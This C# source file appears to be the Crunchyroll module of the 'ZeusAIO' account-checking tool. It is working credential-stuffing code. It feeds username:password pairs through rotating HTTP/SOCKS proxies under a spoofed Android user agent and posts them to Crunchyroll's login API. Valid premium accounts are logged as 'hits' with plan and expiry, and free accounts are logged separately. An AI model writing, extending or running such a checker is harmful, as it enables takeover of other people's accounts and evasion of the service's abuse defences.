using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;

namespace CrunchyRoll
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.KeepAlive = true;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://api.crunchyroll.com/start_session.0.json", "device_type=com.crunchyroll.windows.desktop&device_id=<guid>&access_token=LNDJgOit5yaRIWN", "application/x-www-form-urlencoded").ToString();
                        string sessionid = Regex.Match(text2, "\"session_id\":\"(.*?)\"").Groups[1].Value.ToString();
                        string text3 = httpRequest.Post("https://api.crunchyroll.com/login.0.json", "account=" + s[0] + "&password=" + s[1] + "&session_id=" + sessionid + "&locale=enUS&version=1.3.1.0&connectivity_type=wifi", "application/x-www-form-urlencoded").ToString();
                        if (text3.Contains("premium\":\"\",\""))
                        {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[FREE - CRUNCHYROLL] " + s[0] + ":" + s[1], Color.OrangeRed);
                                }
                                Export.AsResult("/Crunchyroll_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                            bool flag9 = text3.Contains("Incorrect login information");
                            if (flag9)
                            {
                                // Bad
                                break;
                            }
                            if (text3.Contains("premium\":\""))
                            {
                                string Plan = Check.Parse(text3, "premium\":\"", "\",\"");
                                string Expiry = Check.Parse(text3, "expires\":\"", "T");
                                ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - CRUNCHYROLL] " + s[0] + ":" + s[1] + " | Expiry: " + Expiry + " | Plan: " + Plan, Color.Green);
                                    }
                                    Export.AsResult("/Crunchyroll_hits", s[0] + ":" + s[1] + " | Expiry: " + Expiry + " | Plan: " + Plan);
                                    return false;
                           }
                            else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                        }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }

     
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}